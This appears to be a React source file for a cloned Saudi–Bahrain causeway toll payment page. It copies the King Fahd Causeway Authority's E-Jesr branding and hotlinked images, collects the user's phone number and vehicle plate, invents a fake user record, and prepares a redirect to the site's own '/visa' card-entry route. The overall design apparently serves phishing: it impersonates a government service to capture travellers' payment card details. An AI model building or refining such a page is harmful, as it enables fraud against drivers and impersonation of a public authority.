import React, { useRef, useState } from "react";

const Main = () => {
  const [toastMessage, setToastMessage] = useState("");
  const toastTimerRef = useRef(null);
  const [mobileNumber, setMobileNumber] = useState("");
  const [tripType, setTripType] = useState("round");
  const [vehicleType, setVehicleType] = useState("2");
  const [vehicleNationality, setVehicleNationality] = useState("SA");
  const [hasTrailer, setHasTrailer] = useState("false");
  const [currency, setCurrency] = useState("sar");
  const [paymentMethod, setPaymentMethod] = useState("visa");
  const [loading] = useState(false);
  // Plate State
  const [plateChar1, setPlateChar1] = useState("");
  const [plateChar2, setPlateChar2] = useState("");
  const [plateChar3, setPlateChar3] = useState("");
  const [plateNumber, setPlateNumber] = useState("");

  const price = currency === "sar" ? 70 : 7;
  const currencyText = currency === "sar" ? "ريال سعودي" : "دينار بحريني";

  const arabicToEnglishMap = {
    أ: "A",
    ب: "B",
    ح: "J",
    د: "D",
    ر: "R",
    س: "S",
    ص: "X",
    ط: "T",
    ع: "E",
    ق: "G",
    ك: "K",
    ل: "L",
    م: "Z",
    ن: "N",
    ه: "H",
    و: "U",
    ي: "V",
  };

  const westernToArabicDigits = {
    0: "٠",
    1: "١",
    2: "٢",
    3: "٣",
    4: "٤",
    5: "٥",
    6: "٦",
    7: "٧",
    8: "٨",
    9: "٩",
  };

  const toArabicDigits = (num) =>
    num
      .split("")
      .reverse()
      .map((d) => westernToArabicDigits[d] || d)
      .join(" ");
  const toEnglishDigits = (num) => num.split("").reverse().join(" ");
  const showErrorToast = (message) => {
    setToastMessage(message);
    window.clearTimeout(toastTimerRef.current);
    toastTimerRef.current = window.setTimeout(() => {
      setToastMessage("");
    }, 2500);
  };

  const handlePayment = () => {
    if (mobileNumber.length < 9) {
      showErrorToast("الرجا ادخال رقم الجوال بشكل صحيح");
      return;
    }
    if (!plateChar1 || !plateChar2 || !plateChar3 || !plateNumber) {
      showErrorToast("الرجاء اكمال بريات اللوحة");
      return;
    }

    const id = Math.floor(Math.random() * 1000000);
    sessionStorage.setItem("id", id);
    sessionStorage.setItem("price", price);
    const data = {
      _id: id,
      fullname: "User_" + mobileNumber,
      email: mobileNumber + "@salama.sa",
    };
    // window.location.href = `/visa?data=${encodeURIComponent(JSON.stringify(data))}`;
  };
  return (
    <div
      className="bg-gray-50 min-h-screen text-right flex flex-col items-center"
      dir="rtl"
    >
      {/* Header */}
      <header className="flex flex-wrap items-center md:flex-row flex-col gap-y-3 justify-between py-4 px-6 mb-6 border-b bg-[#218795] text-white shadow-md w-full">
        <ul className="flex items-center gap-6 list-none mb-0">
          <li>
            <a href="https://kfca.sa/" target="_blank" rel="noreferrer">
              <img src="/header1.png" alt="KFCA" className="h-10" />
            </a>
          </li>
          <li>
            <a href="https://kfca.sa/EJesr" target="_blank" rel="noreferrer">
              <img src="/header2.png" alt="EJesr" className="h-10" />
            </a>
          </li>
        </ul>
        <div className="flex items-center">
          <button
            type="button"
            className="hover:bg-white/30 text-white px-3 py-1 rounded text-base font-bold shadow-sm transition-all"
            style={{
              background:
                "linear-gradient(90deg,#269a8c 0%,#249588 1%,#1d7172 9%,#17535e 18%,#113a4f 28%,#0d2743 39%,#0b1a3a 52%,#091235 68%,#091034 100%)",
            }}
          >
            EN
          </button>
        </div>
      </header>

      <main className="w-full max-w-4xl px-3 pb-12 flex flex-col justify-center items-center">
        {/* Banner Section */}
        <div
          className="text-white rounded-lg p-6 text-center shadow-lg w-full"
          style={{
            background:
              "linear-gradient(90deg,#269a8c 0%,#249588 1%,#1d7172 9%,#17535e 18%,#113a4f 28%,#0d2743 39%,#0b1a3a 52%,#091235 68%,#091034 100%)",
          }}
        >
          <h3 className="text-2xl font-bold mb-4">
            خدمة الدفع لمرة واحدة للعبور
          </h3>
          <p className="mb-2 text-lg">
            يمكنك استخدام خدمة الدفع لمرة واحدة للعبور وذلك من خلال إدخال لوحة
            المركبة
          </p>
          <div className="items-center gap-3 mb-2">
            <p>
              {" "}
              كما يمكنكم شحن قيمة العبور من خلال تطبيق "جسر" للعبور من المسارات
              المخصصة لـ{" "}
              <span className="bg-[#800080] text-white rounded-md font-bold text-sm px-2 py-1">
                E-JESR
              </span>
            </p>
          </div>
          <div className="flex justify-center items-center gap-4 mb-3">
            <span className="text-sm opacity-80 ">لتحميل التطبيق</span>
            <a
              href="https://play.google.com/store/apps/details?id=com.kfca.sa.jesr"
              target="_blank"
              rel="noreferrer"
            >
              <img
                src="https://kfca.sa/EJesr/images/google-play.png"
                alt="Google Play"
                className="h-8"
              />
            </a>
            <a
              href="https://apps.apple.com/sa/app/جسر/id1482105365"
              target="_blank"
              rel="noreferrer"
            >
              <img
                src="https://kfca.sa/EJesr/images/appstore.png"
                alt="App Store"
                className="h-8"
              />
            </a>
          </div>
        </div>

        {/* Form Section */}
        <section className="bg-white rounded-xl shadow-xl py-8 px-3 border border-gray-100 w-11/12 -mt-5">
          <div className="pb-6 flex items-center w-full gap-x-3 border-b mb-6">
            <img
              src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='127.054' height='81.441' viewBox='0 0 127.054 81.441'%3E%3Cdefs%3E%3ClinearGradient id='linear-gradient' y1='0.5' x2='1' y2='0.5' gradientUnits='objectBoundingBox'%3E%3Cstop offset='0' stop-color='%23269a8c'/%3E%3Cstop offset='0.237' stop-color='%231b6a6d'/%3E%3Cstop offset='0.467' stop-color='%23134354'/%3E%3Cstop offset='0.678' stop-color='%230d2742'/%3E%3Cstop offset='0.863' stop-color='%230a1637'/%3E%3Cstop offset='1' stop-color='%23091034'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath id='Path_5506' data-name='Path 5506' d='M1703.031,8493.276c-21.269-3.372-41.187-9.479-56.073-10.329-22.444-1.282-80.107,64.825-64.444,71.134,7.836,3.157,41.425,9.188,57.236,10.268C1660.286,8565.752,1723.008,8496.443,1703.031,8493.276Z' transform='translate(-1579.854 -8482.929)' fill='url(%23linear-gradient)' style='mix-blend-mode: multiply;isolation: isolate'/%3E%3C/svg%3E%0A"
              className="w-12"
              alt="icon"
            />
            <h2 className="text-xl font-bold text-[#218795]">
              لإستخدام الخدمة أدخل رقم الجوال
            </h2>
          </div>

          <div className="mb-8 max-w-md">
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              رقم الجوال
            </label>
            <div className="flex gap-2">
              <div className="flex-1 flex items-center border rounded-lg focus-within:ring-2 focus-within:ring-[#218795] transition-all bg-gray-50 overflow-hidden">
                <input
                  type="tel"
                  maxLength="9"
                  className="w-full py-3 px-4 bg-transparent outline-none text-left"
                  dir="ltr"
                  placeholder="5xxxxxxxx"
                  value={mobileNumber}
                  onChange={(e) => setMobileNumber(e.target.value)}
                />
                <span className="px-3 text-gray-500 font-mono text-sm border-l">
                  966+
                </span>
              </div>
            </div>
          </div>

          <div className="space-y-10">
            <div className="border-b pb-4 flex gap-x-3 items-center">
              <img
                src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='127.054' height='81.441' viewBox='0 0 127.054 81.441'%3E%3Cdefs%3E%3ClinearGradient id='linear-gradient' y1='0.5' x2='1' y2='0.5' gradientUnits='objectBoundingBox'%3E%3Cstop offset='0' stop-color='%23269a8c'/%3E%3Cstop offset='0.237' stop-color='%231b6a6d'/%3E%3Cstop offset='0.467' stop-color='%23134354'/%3E%3Cstop offset='0.678' stop-color='%230d2742'/%3E%3Cstop offset='0.863' stop-color='%230a1637'/%3E%3Cstop offset='1' stop-color='%23091034'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath id='Path_5506' data-name='Path 5506' d='M1703.031,8493.276c-21.269-3.372-41.187-9.479-56.073-10.329-22.444-1.282-80.107,64.825-64.444,71.134,7.836,3.157,41.425,9.188,57.236,10.268C1660.286,8565.752,1723.008,8496.443,1703.031,8493.276Z' transform='translate(-1579.854 -8482.929)' fill='url(%23linear-gradient)' style='mix-blend-mode: multiply;isolation: isolate'/%3E%3C/svg%3E%0A"
                className="w-12"
                alt="icon"
              />
              <h2 className="text-xl font-bold text-[#218795]">
                معلومات الرحلة
              </h2>
            </div>

            <div className="grid grid-cols-1  gap-8">
              {/* Trip Type */}
              <div className="space-y-4">
                <label className="block text-sm font-semibold text-gray-700">
                  نوع الرحلة
                </label>
                <div className="flex flex-col gap-3">
                  <label className="flex items-center gap-3 cursor-pointer group">
                    <input
                      type="radio"
                      name="TripType"
                      className="w-5 h-5 accent-[#218795]"
                      checked={tripType === "round"}
                      onChange={() => setTripType("round")}
                    />
                    <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                      رحلة ذهابا وإيابا
                    </span>
                  </label>
                  <label className="flex items-center gap-3 cursor-pointer group">
                    <input
                      type="radio"
                      name="TripType"
                      className="w-5 h-5 accent-[#218795]"
                      checked={tripType === "oneway"}
                      onChange={() => setTripType("oneway")}
                    />
                    <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                      رحلة ذهاب فقط
                    </span>
                  </label>
                </div>
              </div>

              {/* Vehicle Type */}
              <div className="space-y-3">
                <label className="block text-sm font-semibold text-gray-700">
                  نوع المركبة
                </label>
                <select
                  className="w-full py-3 px-4 border-2 border-gray-200 rounded-lg focus:ring-2 focus:ring-[#218795] outline-none bg-gray-50 font-bold"
                  value={vehicleType}
                  onChange={(e) => setVehicleType(e.target.value)}
                >
                  <option value="0">اختر</option>
                  <option value="2">سيارة</option>
                  <option value="3">نقل خاص</option>
                </select>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
              {/* Vehicle Nationality */}
              <div className="space-y-4">
                <label className="block text-sm font-semibold text-gray-700">
                  بلد إصدار إستمارة المركبة
                </label>
                <div className="flex flex-col gap-3">
                  <label className="flex items-center gap-3 cursor-pointer group">
                    <input
                      type="radio"
                      name="Nationality"
                      className="w-5 h-5 accent-[#218795]"
                      checked={vehicleNationality === "SA"}
                      onChange={() => setVehicleNationality("SA")}
                    />
                    <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                      المملكة العربية السعودية
                    </span>
                  </label>
                  <label className="flex items-center gap-3 cursor-pointer group">
                    <input
                      type="radio"
                      name="Nationality"
                      className="w-5 h-5 accent-[#218795]"
                      checked={vehicleNationality === "BH"}
                      onChange={() => setVehicleNationality("BH")}
                    />
                    <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                      مملكة البحرين
                    </span>
                  </label>
                </div>
              </div>
            </div>

            {/* Plate Input Section */}
            <div className="sa-plate-wrapper space-y-8 bg-gray-50  rounded-xl border-2 border-dashed border-gray-200">
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 items-start">
                <div className="lg:col-span-2 space-y-6">
                  <div className="grid grid-cols-1 gap-4 w-11/12 mx-auto">
                    <div className="space-y-2 text-center p-1 ">
                      <label className="text-sm font-bold  text-right w-full">
                        الحرف الأول (يمين)
                      </label>
                      <select
                        className="w-full p-2 border-2 rounded bg-white text-right font-bold"
                        value={plateChar1}
                        onChange={(e) => setPlateChar1(e.target.value)}
                      >
                        <option hidden>اختر</option>
                        {"أبحدرسصطعقكلمنهوي".split("").map((l) => (
                          <option key={l} value={l}>
                            {l}
                          </option>
                        ))}
                      </select>
                    </div>
                    <div className="space-y-2 text-center p-1 ">
                      <label className="text-sm font-bold  text-right w-full">
                        الحرف الثاني
                      </label>
                      <select
                        className="w-full p-2 border-2 rounded bg-white text-right font-bold"
                        value={plateChar2}
                        onChange={(e) => setPlateChar2(e.target.value)}
                      >
                        <option hidden>اختر</option>
                        {"أبحدرسصطعقكلمنهوي".split("").map((l) => (
                          <option key={l} value={l}>
                            {l}
                          </option>
                        ))}
                      </select>
                    </div>
                    <div className="space-y-2 text-right p-1 ">
                      <label className="text-sm font-bold  text-right w-full">
                        الحرف الثالث
                      </label>
                      <select
                        className="w-full p-2 border-2 rounded bg-white text-right font-bold"
                        value={plateChar3}
                        onChange={(e) => setPlateChar3(e.target.value)}
                      >
                        <option hidden>اختر</option>
                        {"أبحدرسصطعقكلمنهوي".split("").map((l) => (
                          <option key={l} value={l}>
                            {l}
                          </option>
                        ))}
                      </select>
                    </div>
                  </div>
                  <div className="space-y-2  w-11/12 mx-auto">
                    <label className="text-sm font-bold  text-right w-full">
                      الأرقام (من اليسار إلى اليمين)
                    </label>
                    <input
                      type="text"
                      maxLength="4"
                      inputMode="numeric"
                      className="w-full py-3 border-2 rounded bg-white text-center text-xl font-bold tracking-widest outline-none focus:ring-2 focus:ring-[#218795]"
                      placeholder="1234"
                      value={plateNumber}
                      onChange={(e) => setPlateNumber(e.target.value)}
                    />
                  </div>
                </div>

                <div className="flex flex-col items-center justify-center ">
                  <div
                    className="relative   w-full h-[120px]  rounded-lg shadow-xl overflow-hidden bg-white group hover:scale-[1.02] transition-transform duration-300 ring-4 ring-[#218795]/10 "
                    style={{
                      backgroundImage:
                        "url('https://kfca.sa/EJesr/images/saplate.jpg')",
                      backgroundSize: "cover",
                      backgroundPosition: "center",
                      backgroundRepeat: "no-repeat",
                    }}
                  >
                    <div className="absolute inset-0 flex flex-col py-3 px-4 font-bold items-center justify-center text-black">
                      <div className="flex justify-between items-center w-full h-1/2">
                        <div className="flex-1 text-right text-xl pr-2 -mt-2 tracking-wide">
                          {plateChar1} {plateChar2} {plateChar3}
                        </div>
                        <div className="flex-1 text-left text-[23px]  pl-2 font-mono tracking-tighter">
                          {toArabicDigits(plateNumber)}
                        </div>
                      </div>
                      <div className="flex justify-between items-baseline w-full pt-1 border-t border-black/10">
                        <div className="flex-1 text-right text-xl pr-2 font-mono uppercase tracking-widest">
                          {arabicToEnglishMap[plateChar1] || ""}{" "}
                          {arabicToEnglishMap[plateChar2] || ""}{" "}
                          {arabicToEnglishMap[plateChar3] || ""}
                        </div>
                        <div className="flex-1 text-left text-[23px] pl-2 font-mono tracking-tighter">
                          {toEnglishDigits(plateNumber)}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Has Trailer */}
            <div className="space-y-4">
              <label className="block text-sm font-semibold text-gray-700">
                هل لديك مقطورة؟
              </label>
              <div className="flex gap-10 bg-gray-50 p-4 rounded-lg border border-gray-100">
                <label className="flex items-center gap-3 cursor-pointer group">
                  <input
                    type="radio"
                    name="Trailer"
                    className="w-6 h-6 accent-[#218795]"
                    checked={hasTrailer === "true"}
                    onChange={() => setHasTrailer("true")}
                  />
                  <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                    نعم
                  </span>
                </label>
                <label className="flex items-center gap-3 cursor-pointer group">
                  <input
                    type="radio"
                    name="Trailer"
                    className="w-6 h-6 accent-[#218795]"
                    checked={hasTrailer === "false"}
                    onChange={() => setHasTrailer("false")}
                  />
                  <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                    لا
                  </span>
                </label>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
              {/* Currency Selection */}
              <div className="space-y-4">
                <label className="block text-sm font-semibold text-gray-700">
                  عملة الدفع
                </label>
                <div className="flex gap-8">
                  <label className="flex items-center gap-3 cursor-pointer group">
                    <input
                      type="radio"
                      name="Currency"
                      className="w-6 h-6 accent-[#218795]"
                      checked={currency === "sar"}
                      onChange={() => setCurrency("sar")}
                    />
                    <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                      ريال سعودي
                    </span>
                  </label>
                  <label className="flex items-center gap-3 cursor-pointer group">
                    <input
                      type="radio"
                      name="Currency"
                      className="w-6 h-6 accent-[#218795]"
                      checked={currency === "bhd"}
                      onChange={() => setCurrency("bhd")}
                    />
                    <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                      دينار بحريني
                    </span>
                  </label>
                </div>
              </div>
            </div>

            {/* Amount Summary */}
            <div className="bg-[#2d3436] text-white rounded-xl p-8 flex justify-between items-center shadow-2xl transition hover:scale-[1.01] border-b-8 border-[#218795]">
              <div className="space-y-1">
                <h4 className="text-xl font-bold opacity-90">
                  المبلغ الإجمالي
                </h4>
                <p className="text-sm opacity-60">شامل كافة الرسوم والضرائب</p>
              </div>
              <div className="text-left flex items-baseline gap-3">
                <span className="text-5xl font-bold">{price}</span>
                <span className="text-xl opacity-80">{currencyText}</span>
              </div>
            </div>

            {/* Payment Selection */}
            <div className="grid grid-cols-1  gap-8 pt-8">
              <div className="p-8 bg-white border border-gray-100 rounded-xl shadow-inner space-y-6 flex flex-col justify-center items-center">
                <label className="block text-lg font-bold text-[#2d3436] border-b pb-3 uppercase  w-full tracking-wider">
                  إختر طريقة الدفع
                </label>
                <div className="flex gap-6 flex-col w-full items-center">
                  <button
                    onClick={() => setPaymentMethod("visa")}
                    className={`w-1/2 p-4 border-4 rounded-xl transition-all flex items-center justify-center gap-x-2 ${paymentMethod === "visa" ? "border-[#218795] bg-[#218795]/10 scale-105" : "border-gray-50 hover:border-gray-200"}`}
                  >
                    <img src="/MasterCard.svg" alt="Mada" className="h-6" />
                    <img src="/Visa.svg" alt="Mada" className="h-6" />
                    <img src="/mada.png" alt="Mada" className="h-6" />
                  </button>
                  <button
                    disabled
                    onClick={() => setPaymentMethod("applepay")}
                    className={`w-1/2 p-2 border-4 rounded-xl transition-all flex items-center justify-center ${paymentMethod === "applepay" ? "border-[#218795] bg-[#218795]/10 scale-105" : "border-gray-200 hover:border-gray-200"}`}
                  >
                    <img src="/applepay.png" alt="Apple Pay" className="w-20" />
                  </button>
                </div>
                <button
                  onClick={handlePayment}
                  className="w-1/2  py-3 bg-[#218795] hover:bg-[#1a6d78] text-white rounded-2xl text-2xl font-bold shadow-2xl shadow-[#218795]/30 transition-all active:scale-95 mt-4"
                >
                  ادفع الآن
                </button>
              </div>
            </div>

            <div className="pt-8 text-center">
              <button
                onClick={() => window.location.reload()}
                className="text-gray-400 hover:text-red-500 font-bold transition-colors"
              >
                مسح كافة الحقول
              </button>
            </div>
          </div>
        </section>
      </main>
      {loading && (
        <div className="loader">
          <div className="justify-content-center jimu-primary-loading"></div>
        </div>
      )}
      {toastMessage && (
        <div className="fixed bottom-6 left-1/2 -translate-x-1/2 z-50 px-5 py-3 rounded-lg bg-red-600 text-white shadow-xl text-sm font-semibold">
          {toastMessage}
        </div>
      )}
    </div>
  );
};

export default Main;
